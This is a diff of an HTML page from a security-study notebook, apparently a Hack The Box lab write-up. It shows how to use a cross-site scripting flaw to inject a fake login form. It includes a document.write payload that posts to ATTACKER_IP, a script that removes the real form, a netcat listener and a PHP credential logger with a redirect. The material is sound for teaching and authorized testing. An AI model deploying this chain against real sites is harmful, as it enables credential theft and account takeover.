@@ -3,7 +3,7 @@
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>XSS Phishing (Fake Login Forms) - notebook</title>
+        <title>XSS Phishing — Fake Login Forms &amp; Credential Capture - notebook</title>
 
 
         <!-- Custom HTML head -->
@@ -38,10 +38,10 @@
             const path_to_root = "../../";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "../../searchindex-141abd72.js";
+            window.path_to_searchindex_js = "../../searchindex-e89a1534.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="../../toc-a1a1e25e.js"></script>
+        <script src="../../toc-92cb990d.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -183,18 +183,23 @@
                     <main>
                         <h1 id="xss-phishing-fake-login-forms"><a class="header" href="#xss-phishing-fake-login-forms">XSS Phishing (Fake Login Forms)</a></h1>
 <h2 id="what-it-is"><a class="header" href="#what-it-is">What it is</a></h2>
-<p><strong>XSS phishing</strong> uses cross-site scripting to show <strong>legitimate-looking UI</strong> (often a <strong>login form</strong>) on a site the victim already trusts. Submitted credentials are sent to an <strong>attacker-controlled</strong> endpoint instead of the real application. The attacker can reuse those credentials for account takeover.</p>
-<p>In <strong>authorized assessments</strong>, the same idea can support <strong>phishing simulations</strong>: if employees trust the vulnerable app, a crafted URL tests whether they will enter credentials on unexpected prompts.</p>
+<p><strong>XSS phishing</strong> uses cross-site scripting to show <strong>legitimate-looking UI</strong> (often a <strong>login form</strong>) on a site the victim already trusts. Submitted credentials go to an <strong>attacker-controlled</strong> server so the attacker can <strong>log in as the victim</strong> and access accounts and sensitive data.</p>
+<p>In <strong>authorized</strong> work, a known XSS on an org’s app can double as a <strong>phishing simulation</strong>: employees who trust the domain may not expect a malicious prompt, which measures <strong>security awareness</strong>.</p>
 <h2 id="prerequisites"><a class="header" href="#prerequisites">Prerequisites</a></h2>
-<p>This pattern assumes you already have <strong>executable JavaScript</strong> on the page (stored, reflected, or DOM-based XSS). The delivery mechanism is the same as for other XSS payloads (for example, a <strong>malicious URL</strong> for reflected XSS).</p>
-<h2 id="discovery-on-an-image-url-viewer"><a class="header" href="#discovery-on-an-image-url-viewer">Discovery on an “image URL” viewer</a></h2>
-<p>Apps that load remote images from a user-supplied URL (common in forums and similar sites) often place the parameter in an HTML context where a naïve <code>&lt;script&gt;...&lt;/script&gt;</code> string <strong>does not execute</strong> (for example, inside an <code>img</code> <code>src</code> or similar attribute). Treat that as a signal to run your usual <strong>XSS discovery</strong> workflow: <strong>view the rendered HTML source</strong> after submitting input, identify <strong>context</strong> (attribute vs. text vs. script), and craft a payload that <strong>breaks out</strong> and runs code in that context.</p>
+<p>You need a <strong>working XSS</strong> on the target (stored, reflected, or DOM-based). Delivery matches normal XSS (for example, a <strong>malicious URL</strong> for <strong>reflected</strong> XSS on a <code>GET</code> parameter).</p>
+<h2 id="lab-pattern-phishing-image-url-viewer"><a class="header" href="#lab-pattern-phishing-image-url-viewer">Lab pattern: <code>/phishing</code> image URL viewer</a></h2>
+<p>The module uses a simple <strong>online image viewer</strong>: you pass an image <strong>URL</strong> and the page renders it, e.g.:</p>
+<p><code>http://SERVER_IP/phishing/index.php?url=https://www.hackthebox.eu/images/logo-htb.svg</code></p>
+<p>That pattern appears in <strong>forums</strong> and similar apps. A naïve test like:</p>
+<p><code>...?url=&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></p>
+<p>often <strong>does nothing useful</strong> (dead image icon, no alert): the parameter may land in a context where a raw <code>&lt;script&gt;</code> string <strong>does not execute</strong> (for example attribute or URL context for <code>&lt;img src="..."&gt;</code>).</p>
+<p>Run your <strong>XSS discovery</strong> process: after each attempt, <strong>view page source</strong> and see <strong>exactly</strong> how the server placed your input—then craft a payload that <strong>escapes that context</strong> and runs JavaScript (same discipline as any XSS lab; solve it before building the phishing chain).</p>
 <h2 id="injecting-the-fake-login-form"><a class="header" href="#injecting-the-fake-login-form">Injecting the fake login form</a></h2>
 <ol>
-<li>Build a minimal HTML form whose <strong><code>action</code></strong> points to your machine (the IP you will listen on, e.g. from <code>ip a</code> on <code>tun0</code>). Use <strong><code>method="get"</code></strong> (default) if you want credentials in the query string, or <strong><code>post</code></strong> if your collector expects a body.</li>
-<li>From JavaScript on the vulnerable page, <strong><code>document.write(...)</code></strong> can emit that HTML in one minified line so it fits inside your XSS payload.</li>
+<li>Build HTML for a <strong>login form</strong> whose <strong><code>action</code></strong> is your machine (IP from <code>ip a</code>, often <strong><code>tun0</code></strong> on HTB). With default <strong><code>GET</code></strong>, credentials appear in the <strong>query string</strong> when the victim submits.</li>
+<li>Emit that HTML from the page with <strong><code>document.write('...')</code></strong>, usually <strong>one minified line</strong> inside whatever XSS vector you already proved (replace the <code>alert(window.origin)</code> proof-of-concept with this script).</li>
 </ol>
-<p>Example shape (use your IP and correct <code>input</code> types such as <code>text</code> / <code>password</code>):</p>
+<p>Example markup (use <strong><code>type="text"</code></strong> / <strong><code>type="password"</code></strong> for real browsers; some course snippets use nonstandard <code>type</code> values that still degrade to text-like behavior):</p>
 <pre><code class="language-html">&lt;h3&gt;Please login to continue&lt;/h3&gt;
 &lt;form action="http://ATTACKER_IP"&gt;
   &lt;input type="text" name="username" placeholder="Username"&gt;
@@ -202,49 +207,65 @@
   &lt;input type="submit" name="submit" value="Login"&gt;
 &lt;/form&gt;
 </code></pre>
-<p>Wrapped for injection:</p>
+<p>Injected as one string (note quoting and no line breaks inside the string):</p>
 <pre><code class="language-javascript">document.write('&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://ATTACKER_IP&gt;&lt;input type="text" name="username" placeholder="Username"&gt;&lt;input type="password" name="password" placeholder="Password"&gt;&lt;input type="submit" name="submit" value="Login"&gt;&lt;/form&gt;');
 </code></pre>
-<p>Replace the inner JavaScript with whatever your <strong>working XSS vector</strong> requires (event handler, broken-out attribute, etc.), same as you would for <code>alert(window.origin)</code>.</p>
+<p>For <strong>reflected</strong> XSS, the full attack is typically a <strong>single URL</strong> with your payload in the <strong><code>url</code></strong> (or relevant) parameter—same idea as the reflected XSS notes.</p>
 <h2 id="cleaning-up-the-page"><a class="header" href="#cleaning-up-the-page">Cleaning up the page</a></h2>
-<p>Victims are less likely to use a fake form if the <strong>real</strong> “image URL” field is still visible.</p>
-<ul>
-<li>Use the DOM inspector to find the <strong><code>id</code></strong> of the original form (lab example: <code>urlform</code> on <code>&lt;form id="urlform" ...&gt;</code>).</li>
-<li>After <code>document.write(...)</code>, run <strong><code>document.getElementById('urlform').remove()</code></strong> (adjust the id to match the target page).</li>
-</ul>
-<p>If <strong>trailing HTML</strong> from the original page still appears after your injected markup, appending an <strong>HTML comment opener</strong> after the payload in the reflected parameter can <strong>comment out</strong> the remainder of the server’s template so the page looks like a normal login screen.</p>
-<h2 id="capturing-credentials"><a class="header" href="#capturing-credentials">Capturing credentials</a></h2>
-<h3 id="quick-check-with-netcat"><a class="header" href="#quick-check-with-netcat">Quick check with netcat</a></h3>
-<p>Listen on the port your form posts to (example: port 80):</p>
+<p>If the <strong>real</strong> “image URL” form is still visible, the story (“please login”) is weaker.</p>
+<ol>
+<li>In DevTools, use the <strong>element picker</strong> (e.g. Firefox <strong><code>Ctrl+Shift+C</code></strong>) and click the URL form to read its <strong><code>id</code></strong>.</li>
+<li>In the lab, the GET form is often:</li>
+</ol>
+<pre><code class="language-html">&lt;form role="form" action="index.php" method="GET" id="urlform"&gt;
+  &lt;input type="text" placeholder="Image URL" name="url"&gt;
+&lt;/form&gt;
+</code></pre>
+<ol start="3">
+<li>After <code>document.write(...)</code>, remove it:</li>
+</ol>
+<pre><code class="language-javascript">document.getElementById('urlform').remove();
+</code></pre>
+<p><strong>Chained</strong> with the write call:</p>
+<pre><code class="language-javascript">document.write('...form html...');document.getElementById('urlform').remove();
+</code></pre>
+<p>If <strong>leftover</strong> server HTML still appears <strong>after</strong> your injected block, append an <strong>HTML comment start</strong> immediately after your payload in the vulnerable parameter (e.g. <code>...payload...&lt;!--</code>) so the rest of the template is <strong>commented out</strong> and the page looks like a normal login gate.</p>
+<h2 id="credential-stealing"><a class="header" href="#credential-stealing">Credential stealing</a></h2>
+<h3 id="listener-not-running"><a class="header" href="#listener-not-running">Listener not running</a></h3>
+<p>If the form posts to your IP but <strong>nothing</strong> is listening, the browser shows errors such as <strong>“This site can’t be reached”</strong>—expected until you open a collector.</p>
+<h3 id="quick-capture-with-netcat"><a class="header" href="#quick-capture-with-netcat">Quick capture with netcat</a></h3>
 <pre><code class="language-bash">sudo nc -lvnp 80
 </code></pre>
-<p>A GET form produces a request whose query string carries the fields, for example:</p>
+<p>Submitting the form yields a <strong>GET</strong> with credentials in the URL, for example:</p>
 <pre><code class="language-http">GET /?username=test&amp;password=test&amp;submit=Login HTTP/1.1
 Host: ATTACKER_IP
 </code></pre>
-<p>Netcat shows the credentials but <strong>does not complete HTTP cleanly</strong>, so the browser may show errors.</p>
-<h3 id="smoother-ux-small-php-collector--redirect"><a class="header" href="#smoother-ux-small-php-collector--redirect">Smoother UX: small PHP collector + redirect</a></h3>
-<p>A short script can <strong>log</strong> <code>username</code> / <code>password</code> from the request and <strong><code>Location</code></strong> redirect the victim back to the <strong>legitimate</strong> image viewer (no XSS in the URL on the return), so they believe login succeeded:</p>
+<p>Netcat <strong>does not speak HTTP</strong> properly on the way back, so the victim may see <strong>connection / unable to connect</strong> style errors—usable for a demo, suspicious for a smooth phish.</p>
+<h3 id="smoother-ux-php-logger--redirect"><a class="header" href="#smoother-ux-php-logger--redirect">Smoother UX: PHP logger + redirect</a></h3>
+<p>A tiny <strong><code>index.php</code></strong> can <strong>append</strong> credentials to <strong><code>creds.txt</code></strong> and <strong><code>header("Location: ...")</code></strong> the victim to the <strong>real</strong> image viewer (clean URL, no XSS), so they assume login worked:</p>
 <pre><code class="language-php">&lt;?php
 if (isset($_GET['username']) &amp;&amp; isset($_GET['password'])) {
     $file = fopen("creds.txt", "a+");
     fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
-    header("Location: http://LEGIT_SERVER_IP/phishing/index.php");
+    header("Location: http://SERVER_IP/phishing/index.php");
     fclose($file);
     exit();
 }
 ?&gt;
 </code></pre>
-<p>Serve it with PHP’s built-in server (example):</p>
+<p>Replace <strong><code>SERVER_IP</code></strong> with the <strong>legitimate</strong> app host from the exercise. Serve from a directory that contains this file:</p>
 <pre><code class="language-bash">mkdir -p /tmp/tmpserver &amp;&amp; cd /tmp/tmpserver
-# place index.php here
+# write index.php here
 sudo php -S 0.0.0.0:80
 </code></pre>
-<p>Credentials accumulate in <code>creds.txt</code> on the attacker host.</p>
+<p>Verify <strong><code>creds.txt</code></strong>:</p>
+<pre><code class="language-bash">cat creds.txt
+</code></pre>
+<p>Then share the <strong>final malicious URL</strong> (with the full XSS payload) only in <strong>authorized</strong> tests.</p>
 <h2 id="operational-and-defensive-notes"><a class="header" href="#operational-and-defensive-notes">Operational and defensive notes</a></h2>
 <ul>
-<li><strong>Authorization</strong>: Only run this against systems and users you are permitted to test.</li>
-<li><strong>Defenses</strong>: eliminate XSS (encoding, CSP, safe sinks), use <strong>phishing-resistant authentication</strong>, and train users to treat <strong>unexpected login prompts</strong> as suspicious even on familiar domains.</li>
+<li><strong>Authorization</strong>: Run only where you have permission; credential capture is sensitive.</li>
+<li><strong>Defenses</strong>: fix XSS at the root (encoding, CSP, safe sinks), prefer <strong>phishing-resistant</strong> auth where possible, and train users to treat <strong>unexpected login prompts</strong> as suspicious even on familiar hostnames.</li>
 </ul>
 
                     </main>
@@ -255,7 +276,7 @@ sudo php -S 0.0.0.0:80
                                 <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256 246.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg></span>
                             </a>
 
-                            <a rel="next prefetch" href="../../kubernetes/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                            <a rel="next prefetch" href="../../infosec/xss/xss-discovery.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                 <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z"/></svg></span>
                             </a>
 
@@ -269,7 +290,7 @@ sudo php -S 0.0.0.0:80
                         <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256 246.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg></span>
                     </a>
 
-                    <a rel="next prefetch" href="../../kubernetes/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                    <a rel="next prefetch" href="../../infosec/xss/xss-discovery.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                         <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z"/></svg></span>
                     </a>
             </nav>
